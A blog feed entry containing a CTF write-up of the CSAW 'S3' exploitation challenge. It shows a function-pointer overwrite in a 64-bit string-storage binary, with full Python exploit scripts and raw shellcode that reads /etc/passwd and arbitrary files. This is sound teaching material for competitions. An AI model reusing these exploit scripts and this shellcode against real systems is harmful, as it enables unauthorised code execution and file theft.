<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Csaw | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/csaw/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-02T22:07:47+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW CTF Exploit 300: S3]]></title>
    <link href="http://barrebas.github.io/blog/2014/09/25/CSAW-s3/"/>
    <updated>2014-09-25T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/09/25/CSAW-s3</id>
    <content type="html"><![CDATA[<p>A while ago, we threw together a semi-official <a href="https://ctf-team.vulnhub.com">VulnHub CTF team</a>. This team participated in the CSAW CTF. For me, it was a new and <em>humbling</em> experience. I didn&rsquo;t get a lot of flags but I managed to get this one.</p>

<!--more-->


<p>Upon downloading the binary called <code>s3</code>, I connected to the remote server to quickly see what I was up against.</p>

<p>{% highlight bash %}
$ nc 54.165.225.121 5333
{% endhighlight %}</p>

<p>However, the connection timed out very quickly. I checked out the local copy with file:</p>

<p>{% highlight bash %}
$ file s3
s3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped
{% endhighlight %}</p>

<p>Interesting, a 64 bit binary. Viewing it in <code>hopper</code> suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn&rsquo;t sit well with me, because I could hardly enter the second command to play around.</p>

<p>I fired up <code>gdb-peda</code> and ran the binary. It quickly showed the problem:</p>

<p>{% highlight bash %}
gdb-peda$ r
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need &ldquo;set solib-search-path&rdquo; or &ldquo;set sysroot&rdquo;?
Welcome to Amazon S3 (String Storage Service)</p>

<pre><code>c &lt;type&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;type&gt;
                    Types are:
                        0 - NULL-Terminated String
                        1 - Counted String
r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
x                 - Exit Amazon S3
</code></pre>

<blockquote><p>Program received signal SIGALRM, Alarm clock.
{% endhighlight %}</p></blockquote>

<p><img src="/assets/s3-gdb-alarm.png" alt="s3: gdb caught the alarm." /></p>

<p>Turns out this SIGALRM is generated by a call to <a href="http://linux.die.net/man/2/alarm">alarm()</a>. In hindsight, I could have made a library that overrides the call to <code>alarm()</code>, but I went with the hex-editing approach. I disassembled the binary using <code>objdump</code> and used <code>grep</code> to search the output for &ldquo;alarm&rdquo;:</p>

<p>{% highlight bash %}
$ objdump -d s3 | grep alarm
0000000000401300 &lt;alarm@plt>:
  402126:   e8 d5 f1 ff ff          callq  401300 &lt;alarm@plt>
  403771:   e8 8a db ff ff          callq  401300 &lt;alarm@plt>
{% endhighlight %}</p>

<p>Using <code>xxd</code>, <code>objdump</code> and <code>sed</code>, I replaced those bytes with NOPs and reversed the process with <code>xxd -r</code>, generating a new binary in the process that was devoid of annoying timeouts!</p>

<p>The binary allows the storage of two types of strings: NULL-terminated and so-called &ldquo;counted&rdquo; strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.</p>

<p><img src="/assets/s3-NULL-string.png" alt="s3: NULL-terminated strings, no problems!" /></p>

<p>Next, the obvious target was the &ldquo;counted&rdquo; string. I created a string &ldquo;bleh&rdquo;, updated it to &ldquo;blehbleh&rdquo; and tried to read from it&hellip; segfault! Awesome, we have a lead.</p>

<p><img src="/assets/s3-countedstring-segfault.png" alt="s3: counted strings... Oops!" /></p>

<p>Time to fire up <code>gdb</code> again and try to reproduce the crash:</p>

<p><img src="/assets/s3-reproduced-crash.png" alt="s3: success! Let's see what's going on." /></p>

<p>It looks like the updated string somehow overwrites a function pointer. This pointer is used here:</p>

<p>{% highlight bash %}
=> 0x4019d6:    call   QWORD PTR [rax+0x10]
{% endhighlight %}</p>

<p>Obviously, <code>0x42424242-0x10</code> holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack <code>EIP</code> and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:</p>

<p><img src="/assets/strings.png" alt="s3: exploitation flow" /></p>

<p>We store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode&hellip; confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:</p>

<p><img src="/assets/s3-gdb-id-is-address.png" alt="s3: memory addresses as string identifiers" /></p>

<p>I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:</p>

<p>{% highlight bash %}
$ while [[ 1 ]]; do nc -e ./s3 -v -l -p 5333; done
{% endhighlight %}</p>

<p>Notice that I&rsquo;m using <code>s3</code> again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with <code>ulimit -c unlimited</code> and started scripting and debugging, a lot.</p>

<p>{% highlight python %}</p>

<h1>!/usr/bin/python</h1>

<p>from socket import *
import time, re, struct</p>

<p>def getID(data):
    match = re.search(r&#8217;(\d.*)$&lsquo;, data.strip())&lt;  <br/>
    if match:
        return int(match.group(1))</p>

<p>s = socket(AF_INET, SOCK_STREAM)
s.connect((&lsquo;localhost&rsquo;, 5333))</p>

<h1>banner</h1>

<p>print s.recv(1024)</p>

<h1>send first string. this will be our shellcode</h1>

<p>s.send(&lsquo;c 0 CTF!\n&rsquo;)
data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_shellcode = getID(data)</p>

<p>print &lsquo;[+] first location = 0x{0:08x}&rsquo;.format(p_shellcode)</p>

<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>

<h1>let&rsquo;s crash the binary to see if this works</h1>

<p>s.send(&ldquo;c 1\n&rdquo;)</p>

<p>data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_tmp = getID(data)</p>

<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; AAAA\n&rsquo;)</p>

<p>data = s.recv(64)
p_pivot = getID(data)</p>

<p>print &lsquo;[+] second location = 0x{0:08x}&rsquo;.format(p_pivot)</p>

<h1>send read request to crash binary</h1>

<p>s.send(&lsquo;r &rsquo; + str(p_pivot) + &lsquo;\n&rsquo;)
data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;</p>

<h1>terminate connection cleanly</h1>

<p>time.sleep(0.1)
s.send(&lsquo;x\n&rsquo;)</p>

<p>s.close()
{% endhighlight %}</p>

<p>After running this (and careful debugging of the script) I got a coredump:</p>

<p>{% highlight bash %}
$ python ./amaz.py
Welcome to Amazon S3 (String Storage Service)</p>

<pre><code>c &lt;type&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;type&gt;
                    Types are:
                        0 - NULL-Terminated String
                        1 - Counted String
r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
x                 - Exit Amazon S3
</code></pre>

<p>[+] first location = 0x00b10030
[+] second location = 0x00b10050
bas@tritonal:~/documents/s3 writeup$ gdb ./s3 core
&hellip;snip&hellip;
gdb-peda$ i r
rax            0x41414141   0x41414141
{% endhighlight %}</p>

<p>Good, we have control over <code>rax</code>. Now let&rsquo;s use this to dereference the pointer to the first string:</p>

<p>{% highlight python %}
s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;>L&rsquo;, p_shellcode-0x10) + &lsquo;\n&rsquo;)
{% endhighlight %}</p>

<p>Which obviously still crashes, because now the binary executes:</p>

<p>{% highlight bash %}</p>

<h1>0  0x0000000021465443 in ?? ()</h1>

<p>{% endhighlight %}</p>

<p>Which obviously contains no data, nor any code. But let&rsquo;s give it a proper pointer, shall we? And while I&rsquo;m at it, I&rsquo;ll set the shellcode to <code>INT3</code>. The stack is executable, so this should work!</p>

<p>{% highlight python %}</p>

<h1>!/usr/bin/python</h1>

<p>from socket import *
import time, re, struct</p>

<p>def getID(data):
    match = re.search(r&#8217;(\d.*)$&lsquo;, data.strip())
    if match:
        return int(match.group(1))</p>

<p>s = socket(AF_INET, SOCK_STREAM)
s.connect((&lsquo;localhost&rsquo;, 5333))</p>

<h1>banner</h1>

<p>print s.recv(1024)</p>

<h1>send first string. this will be our shellcode</h1>

<p>s.send(&lsquo;c 0 \xCC\xCC\xCC\xCC\n&rsquo;)
data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_shellcode = getID(data)</p>

<p>print &lsquo;[+] shellcode = 0x{0:08x}&rsquo;.format(p_shellcode)</p>

<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>

<p>s.send(&lsquo;c 0 &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_shellcode) + &lsquo;\n&rsquo;)
data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_pivot = getID(data)</p>

<p>print &lsquo;[+] pivot = 0x{0:08x}&rsquo;.format(p_pivot)</p>

<h1>let&rsquo;s crash the binary to see if this works</h1>

<p>s.send(&ldquo;c 1\n&rdquo;)</p>

<p>data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_tmp = getID(data)</p>

<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_pivot-0x10) + &lsquo;\n&rsquo;)</p>

<p>data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_vuln = getID(data)</p>

<p>print &lsquo;[+] vulnerable pointer = 0x{0:08x}&rsquo;.format(p_vuln)</p>

<h1>send read request to crash binary</h1>

<p>s.send(&lsquo;r &rsquo; + str(p_vuln) + &lsquo;\n&rsquo;)
data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;</p>

<h1>terminate connection cleanly</h1>

<p>time.sleep(0.1)
s.send(&lsquo;x\n&rsquo;)</p>

<p>s.close()
{% endhighlight %}</p>

<p>In the other terminal, I observed:</p>

<p>{% highlight bash %}
connect to [127.0.0.1] from localhost [127.0.0.1] 53500
Trace/breakpoint trap (core dumped)
listening on [any] 5333 &hellip;
{% endhighlight %}</p>

<p>BOOM! Code execution on my local machine!</p>

<p>At this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon <a href="!http://shell-storm.org/shellcode/files/shellcode-878.php">this one</a>.</p>

<p>I stuck it in the exploit and lo and behold:</p>

<p>{% highlight python %}</p>

<h1>!/usr/bin/python</h1>

<p>from socket import *
import time, re, struct</p>

<p>def getID(data):
    match = re.search(r&#8217;(\d.*)$&lsquo;, data.strip())
    if match:
        return int(match.group(1))</p>

<p>s = socket(AF_INET, SOCK_STREAM)
s.connect((&lsquo;localhost&rsquo;, 5333))</p>

<h1>banner</h1>

<p>print s.recv(1024)</p>

<h1>send first string. this will be our shellcode</h1>

<p>s.send(&lsquo;c 0 \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\n&rsquo;)</p>

<p>data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_shellcode = getID(data)</p>

<p>print &lsquo;[+] shellcode = 0x{0:08x}&rsquo;.format(p_shellcode)</p>

<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>

<p>s.send(&lsquo;c 0 &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_shellcode) + &lsquo;\n&rsquo;)
data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_pivot = getID(data)</p>

<p>print &lsquo;[+] pivot = 0x{0:08x}&rsquo;.format(p_pivot)</p>

<h1>let&rsquo;s crash the binary to see if this works</h1>

<p>s.send(&ldquo;c 1\n&rdquo;)</p>

<p>data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_tmp = getID(data)</p>

<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_pivot-0x10) + &lsquo;\n&rsquo;)</p>

<p>data = s.recv(64)
s.recv(2)   # receive pesky &lsquo;> &rsquo;
p_vuln = getID(data)</p>

<p>print &lsquo;[+] vulnerable pointer = 0x{0:08x}&rsquo;.format(p_vuln)</p>

<h1>send read request to crash binary</h1>

<p>s.send(&lsquo;r &rsquo; + str(p_vuln) + &lsquo;\n&rsquo;)</p>

<p>print s.recv(1000)</p>

<h1>terminate connection cleanly</h1>

<p>time.sleep(0.1)
s.send(&lsquo;x\n&rsquo;)</p>

<p>s.close()
{% endhighlight %}</p>

<p>{% highlight bash %}
[+] shellcode = 0x01355030
[+] pivot = 0x01355030
[+] vulnerable pointer = 0x013552b0
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
&hellip;snip&hellip;
{% endhighlight %}</p>

<p>This also worked against the remote server! It showed me that there was a user called <code>amazon</code> with home directory <code>/home/amazon</code>. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:</p>

<p>{% highlight bash %}
; NULL byte fix
xor byte [rdi + 11], 0x41
{% endhighlight %}</p>

<p>We need to update the value 11, or <code>0x0b</code>. The exploit code was modified once more, spraying <code>time.sleep()</code> calls here and there:</p>

<p>{% highlight python %}</p>

<h1>!/usr/bin/python</h1>

<p>from socket import *
import time, re, struct, sys</p>

<p>def getID(data):
    match = re.search(r&#8217;(\d.*)&lsquo;, data.strip())
    if match:
        return int(match.group(1))</p>

<p>s = socket(AF_INET, SOCK_STREAM)
s.connect((&lsquo;localhost&rsquo;, 5333))</p>

<h1>banner</h1>

<p>s.recv(1024)</p>

<p>length = len(sys.argv[1])
filename = sys.argv[1].strip()</p>

<h1>send first string. this will be our shellcode</h1>

<p>s.send(&lsquo;c 0 \xeb\x3f\x5f\x80\x77&rsquo;+struct.pack(&lsquo;&lt;b&rsquo;, length)+&lsquo;\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff&rsquo;+filename+&lsquo;A\n&rsquo;)</p>

<p>time.sleep(0.1)</p>

<h1>s.recv(2)  # receive pesky &lsquo;> &rsquo;</h1>

<p>data = s.recv(64)
p_shellcode = getID(data)</p>

<p>print &lsquo;[+] shellcode = 0x{0:08x}&rsquo;.format(p_shellcode)</p>

<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>

<p>s.send(&lsquo;c 0 &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_shellcode) + &lsquo;\n&rsquo;)</p>

<p>time.sleep(0.1)
data = s.recv(64)
p_pivot = getID(data)</p>

<p>print &lsquo;[+] pivot = 0x{0:08x}&rsquo;.format(p_pivot)</p>

<h1>let&rsquo;s crash the binary to see if this works</h1>

<p>s.send(&ldquo;c 1\n&rdquo;)</p>

<p>time.sleep(0.1)
data = s.recv(64)
p_tmp = getID(data)</p>

<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_pivot-0x10) + &lsquo;\n&rsquo;)</p>

<p>time.sleep(0.1)
data = s.recv(64)
p_vuln = getID(data)</p>

<p>print &lsquo;[+] vulnerable pointer = 0x{0:08x}&rsquo;.format(p_vuln)</p>

<h1>send read request to crash binary</h1>

<p>s.send(&lsquo;r &rsquo; + str(p_vuln) + &lsquo;\n&rsquo;)</p>

<p>time.sleep(0.1)
print s.recv(1024)</p>

<h1>terminate connection cleanly</h1>

<p>time.sleep(0.1)
s.send(&lsquo;x\n&rsquo;)</p>

<p>s.close()
{% endhighlight %}</p>

<p>(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).</p>

<p>Now it was a matter of getting the flag. I tried <code>/home/amazon/key</code>, which returned nothing. Next was <code>/home/amazon/flag</code> and that was a bingo :)</p>
]]></content>
  </entry>
  
</feed>
